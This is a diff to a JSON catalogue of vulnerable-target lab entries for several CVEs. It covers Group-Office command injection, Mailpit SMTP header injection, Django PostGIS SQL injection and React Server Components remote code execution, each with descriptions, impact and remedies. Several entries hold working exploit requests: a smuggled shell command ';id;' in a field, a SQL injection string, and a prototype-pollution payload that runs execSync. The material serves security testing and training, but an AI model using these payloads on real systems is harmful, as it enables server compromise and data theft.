+    "impact": "Attackers can execute arbitrary system commands, leading to complete server compromise.\n",
+    "remedy": "Use language-specific APIs instead of shell commands, or sanitize all inputs with escapeshellarg().\n",
+    "remediation": [
+      "Avoid calling OS commands from application code",
+      "Use language-specific APIs instead of shell commands",
+      "Never concatenate user input into commands",
+      "Use escapeshellarg() for any user input passed to shell"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-25512.nuclei.yaml"
+      ],
+      "bambda": [
+        "vt-2026-25512.bambda"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "port": 8080
+      }
+    },
+    "post-install": [
+      "Start lab: docker-compose up -d",
+      "Wait for initialization (~2 minutes on first run)",
+      "Access Group-Office installer: http://localhost:8080",
+      "username: admin - password: Squint2-Shredder7-Grove3-Thirteen3-Recluse9",
+      "nuclei -t vt-2026-25512.nuclei.yaml -u http://localhost:8000 -v  -var username=admin -var password=Squint2-Shredder7-Grove3-Thirteen3-Recluse9",
+      "Complete installation wizard (DB host: db, user/pass/db: groupoffice)",
+      "Login and get session cookie for exploit testing",
+      "Vulnerable endpoint: POST /api/email/message/tnefAttachmentFromTempFile",
+      "Example payload: tmp_file=dummy.dat;id;#"
+    ],
+    "category": "cves",
+    "added_date": "2026-02-06T18:06:55+03:00"
+  },
+  {
+    "id": "vt-2026-23829",
+    "info": {
+      "name": "mailpit - Mailpit has an SMTP Header Injection via Regex Bypass",
+      "author": "omarkurt",
+      "description": "Mailpit is an email testing tool and API for developers. Prior to version 1.28.3, Mailpit's SMTP server is vulnerable to Header Injection due to an insufficient Regular Expression used to validate `RCPT TO` and `MAIL FROM` addresses. An attacker can inject arbitrary SMTP headers (or corrupt existing ones) by including carriage return characters (`\\r`) in the email address. This header injection occurs because the regex intended to filter control characters fails to exclude `\\r` and `\\n` when used inside a character class. Version 1.28.3 fixes this issue.\n",
+      "targets": [
+        "mailpit",
+        "web",
+        "SMTP"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-23829",
+      "cwe": "CWE-150",
+      "cvss": {
+        "score": 5.3,
+        "severity": "medium"
+      },
+      "affected_versions": [
+        "<= 1.28.2"
+      ],
+      "tags": [
+        "go",
+        "medium",
+        "cve-2026",
+        "mailpit",
+        "header-injection",
+        "smtp",
+        "network"
+      ],
+      "references": [
+        "https://github.com/axllent/mailpit/commit/36cc06c125954dec6673219dafa084e13cc14534",
+        "https://github.com/axllent/mailpit/releases/tag/v1.28.3",
+        "https://github.com/axllent/mailpit/security/advisories/GHSA-54wq-72mp-cq7c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-23829",
+        "https://github.com/advisories/GHSA-54wq-72mp-cq7c",
+        "https://vulnerabletarget.com/VT-2026-23829"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "SMTP",
+      "method": "MAIL FROM / RCPT TO",
+      "request": "EHLO example.com\nMAIL FROM:<attacker@example.com>\nRCPT TO:<victim\\rX-Injected:true@example.com>\nDATA\n...\n",
+      "response": "250 Ok\n(Header injected in received email)\n"
+    },
+    "technical": "SMTP Header Injection via insufficient regex in address validation.\nFile: internal/smtp/session.go\n\nThe regex pattern used to validate MAIL FROM and RCPT TO addresses:\n  var (\n    addressRegex = regexp.MustCompile(`[^\\x00-\\x1f]+`)  // Flawed regex\n  )\n\nThe regex fails to properly exclude carriage return (\\r, 0x0D) and\nline feed (\\n, 0x0A) characters when used inside a negated character class.\nThis allows an attacker to inject arbitrary SMTP headers by including\nbare CR characters in the email address.\n\nPayload: MAIL FROM:<attacker\\rX-Pwned:injected>\nThe \\r (0x0D) breaks out of the address and injects a new header line.\n",
+    "impact": "Attackers can inject arbitrary SMTP headers into emails processed by Mailpit.\nThis could lead to:\n- Email spoofing and phishing attacks\n- Bypassing spam filters\n- Corrupting email metadata\n- Potential email routing manipulation\n",
+    "remedy": "Update Mailpit to version 1.28.3 or later.\nThe fix properly validates email addresses using RFC-compliant parsing\ninstead of a flawed regex pattern.\n",
+    "poc": {
+      "nuclei": [
+        "vt-2026-23829-inject.yaml",
+        "vt-2026-23829-verify.yaml",
+        "vt-2026-23829-workflow.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "ports": [
+          1025,
+          8025
+        ]
+      }
+    },
+    "post-install": [
+      "Access Mailpit UI at http://localhost:8025",
+      "SMTP Service available at localhost:1025",
+      "No authentication required",
+      "Use vt-2026-23829-inject.yaml to send a test email with header injection payload",
+      "Use vt-2026-23829-verify.yaml to check for the injected header in the received email",
+      "or run vt-2026-23829-workflow.yaml to execute both steps in sequence"
+    ],
+    "category": "cves",
+    "added_date": "2026-02-06T18:06:55+03:00"
+  },
+  {
+    "id": "vt-2026-1207",
+    "info": {
+      "name": "Django SQL Injection in RasterField lookup (CVE-2026-1207)",
+      "author": "omarkurt",
+      "description": "An issue was discovered in Django 6.0 before 6.0.2, 5.2 before 5.2.11, and 4.2 before 4.2.28.\nRaster lookups on ``RasterField`` (only implemented on PostGIS) allows remote attackers to inject SQL via the band index parameter.\n",
+      "targets": [
+        "django"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-1207",
+      "cwe": "CWE-89",
+      "cvss": {
+        "score": 8.1,
+        "severity": "high"
+      },
+      "affected_versions": [
+        "< 6.0.2",
+        "< 5.2.11",
+        "< 4.2.28"
+      ],
+      "tags": [
+        "sqli",
+        "django",
+        "postgis",
+        "injection"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/",
+      "method": "GET",
+      "param": "band",
+      "request": "GET /?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)%20-- HTTP/1.1\nHost: {{target}}\n",
+      "response": "HTTP/1.1 500 Internal Server Error\n\nError: invalid input syntax for type integer: \"PostgreSQL 15.4 ...\"\n"
+    },
+    "technical": "SQL Injection in PostGISOperator.check_raster method.\nFile: django/contrib/gis/db/backends/postgis/operations.py\n\nThe band_lhs/band_rhs parameters are concatenated directly into SQL via\nstring formatting (%s) instead of parameterized queries:\n  template_params[\"rhs\"] = \"%s, %s\" % (template_params[\"rhs\"], lookup.band_rhs)\n\nPayload: 1) AND 1=CAST((SELECT version()) AS INT) --\nThis closes the ST_Intersects function and injects arbitrary SQL.\n",
+    "impact": "Attackers can execute arbitrary SQL commands on the PostGIS database,\npotentially leading to data extraction, modification, or deletion.\n",
+    "remedy": "Update Django to version 6.0.2, 5.2.11, or 4.2.28.\nAlternatively, validate band index parameter to ensure it's an integer.\n",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-1207",
+      "https://www.djangoproject.com/weblog/2026/feb/04/security-releases/",
+      "https://github.com/django/django/security/advisories",
+      "https://vulnerabletarget.com/VT-2026-1207"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-1207.nuclei.yaml"
+      ],
+      "bambda": [
+        "vt-2026-1207.bambda"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "port": 8000
+      }
+    },
+    "category": "cves",
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-2025-64459",
@@ -3931,7 +4158,68 @@
       "Test exploit: ?status=private&title__icontains=Area"
     ],
     "category": "cves",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
+  },
+  {
+    "id": "vt-2025-55182",
+    "info": {
+      "name": "React Server Components - Remote Code Execution",
+      "author": "omarkurt",
+      "description": "React Server Components 19.0.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,\nreact-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused\nby unsafe deserialization of payloads from HTTP requests to Server Function endpoints.\n",
+      "targets": [
+        "react-server-components",
+        "nextjs"
+      ],
+      "type": "CVE",
+      "affected_versions": [
+        "React 19.0.0, 19.1.1, 19.2.0",
+        "Next.js < 15.0.4"
+      ],
+      "fixed_version": "React 19.2.1, Next.js 15.0.4",
+      "cve": "CVE-2025-55182",
+      "cwe": "CWE-502",
+      "cvss": {
+        "score": "10.0",
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "tags": [
+        "rce",
+        "deserialization",
+        "react",
+        "nextjs"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/",
+      "method": "POST",
+      "param": "multipart/form-data",
+      "request": "POST / HTTP/1.1\nNext-Action: x\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\n...\n"
+    },
+    "technical": "Pre-authentication Remote Code Execution in React Server Components (RSC).\nExploits unsafe deserialization in Server Action response processing.\nAn attacker can pollute the object prototype and trigger arbitrary Node.js code\nexecution via the `_prefix` property in the RSC stream.\n",
+    "impact": "Total system compromise. An unauthenticated attacker can execute arbitrary\nsystem commands on the server with the privileges of the application process.\n",
+    "remedy": "Upgrade React to version 19.2.1 or higher.\nUpgrade Next.js to version 15.0.4 or higher.\n",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-55182",
+      "https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp",
+      "https://github.com/assetnote/react2shell-scanner",
+      "https://github.com/l4rm4nd/CVE-2025-55182"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2025-55182.nuclei.yaml"
+      ]
+    },
+    "remediation": [
+      "Update to React 19.2.1 or newer",
+      "Update to Next.js 15.0.4 or newer"
+    ],
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "category": "cves",
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-2025-29927",
@@ -3984,7 +4272,7 @@
       "http://localhost:3000"
     ],
     "category": "cves",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-2024-53995",
@@ -4034,6 +4322,6 @@
       }
     },
     "category": "cves",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   }
 ]
